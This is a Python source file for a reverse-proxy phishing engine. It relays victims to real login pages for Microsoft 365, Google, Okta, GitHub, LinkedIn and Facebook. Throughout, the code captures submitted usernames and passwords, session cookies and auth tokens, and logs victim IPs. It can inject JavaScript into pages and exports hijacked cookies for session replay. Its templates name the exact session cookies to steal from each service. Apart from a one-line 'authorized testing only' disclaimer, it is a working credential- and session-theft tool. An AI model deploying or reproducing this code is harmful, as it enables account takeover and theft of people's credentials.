"""
Reverse Proxy Phishing Engine

A comprehensive reverse proxy for credential and session capture.
This proxies requests to real target sites while capturing:
- Form submissions (credentials)
- Cookies (session tokens)
- Authentication tokens
- Request/response data

Uses a single server with path-based routing (e.g., /phishlet_id/path)

For authorized security testing only.
"""

import asyncio
import aiohttp
import re
import json
import logging
import uuid
from datetime import datetime
from typing import Dict, List, Optional, Callable, Any
from dataclasses import dataclass, field
from urllib.parse import urlencode
from aiohttp import web, ClientSession, TCPConnector, CookieJar

logger = logging.getLogger(__name__)

# Default proxy port
PROXY_PORT = 8020


@dataclass
class PhishletConfig:
    """Configuration for a phishlet (target site proxy config)"""
    id: str
    name: str
    target_host: str  # e.g., "login.microsoftonline.com"
    phishing_host: str  # e.g., "login-microsoft.attacker.com" (kept for compatibility)
    target_scheme: str = "https"

    # Capture configuration
    capture_cookies: List[str] = field(default_factory=list)
    capture_fields: List[str] = field(default_factory=lambda: ["username", "password", "email", "login", "passwd", "user", "pass"])
    auth_tokens: List[str] = field(default_factory=list)

    # URL patterns that indicate successful authentication
    auth_urls: List[str] = field(default_factory=list)

    # Domain replacements for sub-resources
    sub_filters: Dict[str, str] = field(default_factory=dict)

    # Optional JS to inject
    js_inject: Optional[str] = None

    # Runtime state
    is_active: bool = False
    listen_port: Optional[int] = None


@dataclass
class CapturedSession:
    """A captured victim session"""
    id: str
    phishlet_id: str
    victim_ip: str
    user_agent: str
    created_at: str
    landing_url: str = ""

    # Captured data
    cookies: Dict[str, str] = field(default_factory=dict)
    credentials: Dict[str, str] = field(default_factory=dict)
    tokens: Dict[str, str] = field(default_factory=dict)
    requests: List[Dict] = field(default_factory=list)

    # Auth state
    authenticated: bool = False
    authenticated_at: Optional[str] = None


class ProxyEngine:
    """Core reverse proxy engine for phishing attacks."""

    def __init__(self):
        self.phishlets: Dict[str, PhishletConfig] = {}
        self.sessions: Dict[str, CapturedSession] = {}
        self._client_session: Optional[ClientSession] = None
        self._server_runner: Optional[web.AppRunner] = None
        self._server_started: bool = False
        self._port: int = PROXY_PORT

    async def init(self):
        """Initialize the proxy engine"""
        if self._client_session:
            return

        connector = TCPConnector(ssl=False, limit=100)
        self._client_session = ClientSession(
            connector=connector,
            cookie_jar=CookieJar(unsafe=True),
            timeout=aiohttp.ClientTimeout(total=30)
        )
        logger.info("Proxy engine initialized")

    async def cleanup(self):
        """Cleanup resources"""
        if self._client_session:
            await self._client_session.close()
            self._client_session = None

        if self._server_runner:
            await self._server_runner.cleanup()
            self._server_runner = None
            self._server_started = False

    async def start_server(self, port: int = PROXY_PORT):
        """Start the main proxy server"""
        if self._server_started:
            return {'status': 'already_running', 'port': self._port}

        await self.init()

        app = web.Application()

        # Landing page
        app.router.add_get('/', self._handle_landing)

        # Phishlet routes: /{phishlet_id}/{path}
        app.router.add_route('*', '/{phishlet_id}/{path:.*}', self._handle_proxy_request)

        self._server_runner = web.AppRunner(app)
        await self._server_runner.setup()

        site = web.TCPSite(self._server_runner, '0.0.0.0', port)
        await site.start()

        self._server_started = True
        self._port = port

        logger.info(f"Proxy server started on port {port}")
        return {'status': 'running', 'port': port}

    async def stop_server(self):
        """Stop the proxy server"""
        if self._server_runner:
            await self._server_runner.cleanup()
            self._server_runner = None
            self._server_started = False
            logger.info("Proxy server stopped")

    async def _handle_landing(self, request: web.Request) -> web.Response:
        """Handle requests to the root path"""
        phishlet_list = []
        for pid, config in self.phishlets.items():
            phishlet_list.append(f'<li><a href="/{pid}/">{config.name}</a> - {config.target_host}</li>')

        html = f"""<!DOCTYPE html>
<html>
<head><title>Proxy Server</title></head>
<body>
<h1>Reverse Proxy Server</h1>
<p>Available phishlets:</p>
<ul>{''.join(phishlet_list) if phishlet_list else '<li>No phishlets configured</li>'}</ul>
<p><small>For authorized security testing only.</small></p>
</body>
</html>"""
        return web.Response(text=html, content_type='text/html')

    async def _handle_proxy_request(self, request: web.Request) -> web.Response:
        """Handle proxy requests for a specific phishlet"""
        phishlet_id = request.match_info.get('phishlet_id', '')
        path = request.match_info.get('path', '')

        # Get the phishlet config
        phishlet = self.phishlets.get(phishlet_id)
        if not phishlet:
            return web.Response(
                text=f"Phishlet '{phishlet_id}' not found. Available: {list(self.phishlets.keys())}",
                status=404
            )

        # Ensure client session exists
        if not self._client_session:
            await self.init()

        # Get or create session for this visitor
        session = self._get_or_create_session(phishlet_id, request)

        # Build target URL
        target_url = f"{phishlet.target_scheme}://{phishlet.target_host}/{path}"
        if request.query_string:
            target_url += f"?{request.query_string}"

        # Prepare headers
        headers = {'Host': phishlet.target_host}
        hop_by_hop = {'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
                      'te', 'trailers', 'transfer-encoding', 'upgrade', 'host'}

        for key, value in request.headers.items():
            if key.lower() not in hop_by_hop:
                if key.lower() in ('referer', 'origin'):
                    # Rewrite referer to point to real target
                    value = re.sub(
                        rf'http://[^/]+/{phishlet_id}',
                        f'{phishlet.target_scheme}://{phishlet.target_host}',
                        value
                    )
                headers[key] = value

        # Get request body for POST/PUT
        body = None
        if request.method in ('POST', 'PUT', 'PATCH'):
            content_type = request.content_type or ''

            if 'application/x-www-form-urlencoded' in content_type:
                form_data = dict(await request.post())
                body = urlencode(form_data)

                # Extract credentials
                creds = self._extract_credentials(form_data, phishlet)
                if creds:
                    session.credentials.update(creds)
                    logger.info(f"[{phishlet.name}] Captured credentials: {list(creds.keys())}")

            elif 'application/json' in content_type:
                try:
                    json_data = await request.json()
                    body = json.dumps(json_data)

                    if isinstance(json_data, dict):
                        creds = self._extract_credentials(json_data, phishlet)
                        if creds:
                            session.credentials.update(creds)
                            logger.info(f"[{phishlet.name}] Captured JSON credentials: {list(creds.keys())}")
                except:
                    body = await request.read()
            else:
                body = await request.read()

        # Forward cookies
        cookies = dict(request.cookies)

        try:
            async with self._client_session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=body,
                cookies=cookies,
                allow_redirects=False,
                ssl=False
            ) as resp:
                resp_body = await resp.read()

                # Capture cookies from response
                for cookie in resp.cookies.values():
                    session.cookies[cookie.key] = cookie.value
                    if cookie.key in phishlet.capture_cookies or cookie.key in phishlet.auth_tokens:
                        session.tokens[cookie.key] = cookie.value
                        logger.info(f"[{phishlet.name}] Captured token: {cookie.key}")

                # Check for auth success
                if not session.authenticated:
                    if self._check_auth_success(session, phishlet, str(resp.url), session.cookies):
                        session.authenticated = True
                        session.authenticated_at = datetime.now().isoformat()
                        logger.info(f"[{phishlet.name}] Session {session.id[:8]} authenticated!")

                # Rewrite response content
                content_type = resp.content_type or ''
                if resp_body and ('text' in content_type or 'html' in content_type or
                                  'javascript' in content_type or 'json' in content_type):
                    try:
                        charset = resp.charset or 'utf-8'
                        content = resp_body.decode(charset, errors='replace')
                        content = self._rewrite_content(content, phishlet)
                        resp_body = content.encode(charset)
                    except Exception as e:
                        logger.warning(f"Content rewrite failed: {e}")

                # Build response headers
                resp_headers = {}
                skip_headers = {'content-encoding', 'content-length', 'transfer-encoding',
                               'connection', 'keep-alive'}

                for key, value in resp.headers.items():
                    if key.lower() not in skip_headers:
                        if key.lower() == 'location':
                            # Rewrite redirect locations
                            value = self._rewrite_url(value, phishlet)
                        resp_headers[key] = value

                response = web.Response(
                    body=resp_body,
                    status=resp.status,
                    headers=resp_headers
                )

                # Set session tracking cookie
                response.set_cookie('_proxy_session', session.id, max_age=86400, httponly=True)

                # Forward cookies from target
                for cookie in resp.cookies.values():
                    response.set_cookie(
                        cookie.key,
                        cookie.value,
                        max_age=cookie.get('max-age'),
                        path=f"/{phishlet_id}" + (cookie.get('path') or '/'),
                        httponly=cookie.get('httponly', False)
                    )

                # Log request
                session.requests.append({
                    'timestamp': datetime.now().isoformat(),
                    'method': request.method,
                    'path': f"/{path}",
                    'status': resp.status
                })

                return response

        except aiohttp.ClientError as e:
            logger.error(f"Proxy error for {phishlet.name}: {e}")
            return web.Response(
                text=f"Could not connect to {phishlet.target_host}: {e}",
                status=502
            )
        except Exception as e:
            logger.error(f"Proxy error: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            return web.Response(
                text=f"Proxy error: {e}",
                status=500
            )

    def _rewrite_content(self, content: str, phishlet: PhishletConfig) -> str:
        """Rewrite content to replace target URLs with proxy URLs"""
        # Replace absolute URLs
        content = content.replace(
            f'https://{phishlet.target_host}',
            f'http://localhost:{self._port}/{phishlet.id}'
        )
        content = content.replace(
            f'http://{phishlet.target_host}',
            f'http://localhost:{self._port}/{phishlet.id}'
        )

        # Replace protocol-relative URLs
        content = content.replace(
            f'//{phishlet.target_host}',
            f'//localhost:{self._port}/{phishlet.id}'
        )

        # Apply sub-filters
        for target_domain, replacement in phishlet.sub_filters.items():
            content = content.replace(target_domain, replacement)

        # Inject custom JS if configured
        if phishlet.js_inject and '</head>' in content:
            inject_script = f"<script>{phishlet.js_inject}</script>"
            content = content.replace('</head>', f"{inject_script}</head>")

        return content

    def _rewrite_url(self, url: str, phishlet: PhishletConfig) -> str:
        """Rewrite a URL to go through the proxy"""
        if phishlet.target_host in url:
            url = url.replace(
                f'https://{phishlet.target_host}',
                f'http://localhost:{self._port}/{phishlet.id}'
            )
            url = url.replace(
                f'http://{phishlet.target_host}',
                f'http://localhost:{self._port}/{phishlet.id}'
            )
        return url

    def _get_or_create_session(self, phishlet_id: str, request: web.Request) -> CapturedSession:
        """Get existing session or create a new one"""
        session_id = request.cookies.get('_proxy_session')

        if session_id and session_id in self.sessions:
            return self.sessions[session_id]

        # Create new session
        session_id = str(uuid.uuid4())

        # Safely get landing URL
        try:
            landing_url = str(request.path_qs)
        except:
            landing_url = request.path or '/'

        session = CapturedSession(
            id=session_id,
            phishlet_id=phishlet_id,
            victim_ip=request.remote or 'unknown',
            user_agent=request.headers.get('User-Agent', 'unknown'),
            created_at=datetime.now().isoformat(),
            landing_url=landing_url
        )
        self.sessions[session_id] = session
        logger.info(f"New session {session_id[:8]} from {session.victim_ip}")
        return session

    def _extract_credentials(self, data: Dict[str, Any], phishlet: PhishletConfig) -> Dict[str, str]:
        """Extract credentials from form data"""
        credentials = {}
        for key, value in data.items():
            key_lower = key.lower()
            for field_pattern in phishlet.capture_fields:
                if field_pattern.lower() in key_lower:
                    if isinstance(value, list):
                        value = value[0] if value else ''
                    credentials[key] = str(value)
                    break
        return credentials

    def _check_auth_success(self, session: CapturedSession, phishlet: PhishletConfig,
                           response_url: str, cookies: Dict[str, str]) -> bool:
        """Check if authentication was successful"""
        for auth_url in phishlet.auth_urls:
            if auth_url in response_url:
                return True

        for token_name in phishlet.auth_tokens:
            if token_name in cookies:
                session.tokens[token_name] = cookies[token_name]
                return True

        has_creds = any(k.lower() in ['password', 'passwd', 'pass'] for k in session.credentials.keys())
        has_session = len(session.cookies) > 2

        return has_creds and has_session

    # === Phishlet Management ===

    def add_phishlet(self, config: PhishletConfig):
        """Add a phishlet configuration"""
        self.phishlets[config.id] = config
        logger.info(f"Added phishlet: {config.name} -> {config.target_host}")

    def remove_phishlet(self, phishlet_id: str):
        """Remove a phishlet"""
        if phishlet_id in self.phishlets:
            del self.phishlets[phishlet_id]

    def get_phishlet(self, phishlet_id: str) -> Optional[PhishletConfig]:
        """Get a phishlet by ID"""
        return self.phishlets.get(phishlet_id)

    async def start_phishlet(self, phishlet_id: str, port: int = PROXY_PORT) -> Dict:
        """Start serving a phishlet (starts server if needed)"""
        phishlet = self.phishlets.get(phishlet_id)
        if not phishlet:
            raise ValueError(f"Phishlet {phishlet_id} not found")

        # Start server if not running
        if not self._server_started:
            await self.start_server(port)

        phishlet.is_active = True
        phishlet.listen_port = self._port

        proxy_url = f"http://localhost:{self._port}/{phishlet_id}/"

        logger.info(f"Phishlet {phishlet.name} active at {proxy_url}")

        return {
            'status': 'running',
            'phishlet_id': phishlet_id,
            'port': self._port,
            'proxy_url': proxy_url
        }

    async def stop_phishlet(self, phishlet_id: str):
        """Deactivate a phishlet"""
        if phishlet_id in self.phishlets:
            self.phishlets[phishlet_id].is_active = False
            logger.info(f"Phishlet {phishlet_id} deactivated")

    # === Session Management ===

    def get_sessions(self, phishlet_id: Optional[str] = None) -> List[CapturedSession]:
        """Get captured sessions"""
        sessions = list(self.sessions.values())
        if phishlet_id:
            sessions = [s for s in sessions if s.phishlet_id == phishlet_id]
        return sessions

    def get_session(self, session_id: str) -> Optional[CapturedSession]:
        """Get a specific session"""
        return self.sessions.get(session_id)

    def get_authenticated_sessions(self) -> List[CapturedSession]:
        """Get all authenticated sessions"""
        return [s for s in self.sessions.values() if s.authenticated]

    def export_session_cookies(self, session_id: str, format: str = 'header') -> str:
        """Export session cookies in various formats"""
        session = self.sessions.get(session_id)
        if not session:
            return ""

        if format == 'header':
            return '; '.join(f'{k}={v}' for k, v in session.cookies.items())
        elif format == 'json':
            return json.dumps(session.cookies, indent=2)
        elif format == 'netscape':
            lines = ["# Netscape HTTP Cookie File"]
            phishlet = self.phishlets.get(session.phishlet_id)
            domain = phishlet.target_host if phishlet else 'example.com'
            for name, value in session.cookies.items():
                lines.append(f"{domain}\tTRUE\t/\tFALSE\t0\t{name}\t{value}")
            return '\n'.join(lines)
        return ""

    def get_stats(self) -> Dict:
        """Get proxy engine statistics"""
        return {
            'total_phishlets': len(self.phishlets),
            'active_phishlets': sum(1 for p in self.phishlets.values() if p.is_active),
            'total_sessions': len(self.sessions),
            'authenticated_sessions': len(self.get_authenticated_sessions()),
            'total_credentials': sum(len(s.credentials) for s in self.sessions.values()),
            'total_cookies': sum(len(s.cookies) for s in self.sessions.values()),
            'server_running': self._server_started,
            'server_port': self._port if self._server_started else None
        }


# Global proxy engine instance
proxy_engine = ProxyEngine()


# Pre-built phishlet templates
PHISHLET_TEMPLATES = {
    'microsoft365': PhishletConfig(
        id='microsoft365',
        name='Microsoft 365',
        target_host='login.microsoftonline.com',
        phishing_host='login-microsoft.localhost',
        target_scheme='https',
        capture_cookies=['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT'],
        capture_fields=['login', 'loginfmt', 'passwd', 'password', 'username', 'email'],
        auth_tokens=['ESTSAUTHPERSISTENT'],
        auth_urls=['/kmsi', '/oauth2/authorize', '/common/reprocess'],
        sub_filters={
            'login.live.com': 'login-live.localhost',
            'account.live.com': 'account-live.localhost',
        }
    ),
    'google': PhishletConfig(
        id='google',
        name='Google',
        target_host='accounts.google.com',
        phishing_host='accounts-google.localhost',
        target_scheme='https',
        capture_cookies=['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID'],
        capture_fields=['identifier', 'email', 'password', 'Passwd', 'Email'],
        auth_tokens=['SID', 'HSID'],
        auth_urls=['/signin/challenge', '/ServiceLogin', '/CheckCookie'],
    ),
    'okta': PhishletConfig(
        id='okta',
        name='Okta',
        target_host='login.okta.com',
        phishing_host='login-okta.localhost',
        target_scheme='https',
        capture_cookies=['sid', 'DT'],
        capture_fields=['username', 'password', 'identifier'],
        auth_tokens=['sid'],
        auth_urls=['/app/', '/home/'],
    ),
    'github': PhishletConfig(
        id='github',
        name='GitHub',
        target_host='github.com',
        phishing_host='github.localhost',
        target_scheme='https',
        capture_cookies=['user_session', 'logged_in', '__Host-user_session_same_site'],
        capture_fields=['login', 'password'],
        auth_tokens=['user_session'],
        auth_urls=['/dashboard', '/settings'],
    ),
    'linkedin': PhishletConfig(
        id='linkedin',
        name='LinkedIn',
        target_host='www.linkedin.com',
        phishing_host='linkedin.localhost',
        target_scheme='https',
        capture_cookies=['li_at', 'JSESSIONID', 'liap'],
        capture_fields=['session_key', 'session_password', 'username', 'password'],
        auth_tokens=['li_at'],
        auth_urls=['/feed/', '/mynetwork/'],
    ),
    'facebook': PhishletConfig(
        id='facebook',
        name='Facebook',
        target_host='www.facebook.com',
        phishing_host='facebook.localhost',
        target_scheme='https',
        capture_cookies=['c_user', 'xs', 'datr', 'sb'],
        capture_fields=['email', 'pass', 'login', 'password'],
        auth_tokens=['c_user', 'xs'],
        auth_urls=['/home.php', '/feed/'],
    ),
}


def get_phishlet_template(template_name: str, your_domain: str = 'localhost', company: str = 'company') -> Optional[PhishletConfig]:
    """Get a phishlet template with custom domain"""
    template = PHISHLET_TEMPLATES.get(template_name)
    if not template:
        return None

    # Create a copy with unique ID
    phishlet_id = str(uuid.uuid4())[:8]

    return PhishletConfig(
        id=phishlet_id,
        name=f"{template.name} ({company})",
        target_host=template.target_host,
        phishing_host=f"{template_name}.{your_domain}",
        target_scheme=template.target_scheme,
        capture_cookies=list(template.capture_cookies),
        capture_fields=list(template.capture_fields),
        auth_tokens=list(template.auth_tokens),
        auth_urls=list(template.auth_urls),
        sub_filters=dict(template.sub_filters),
    )
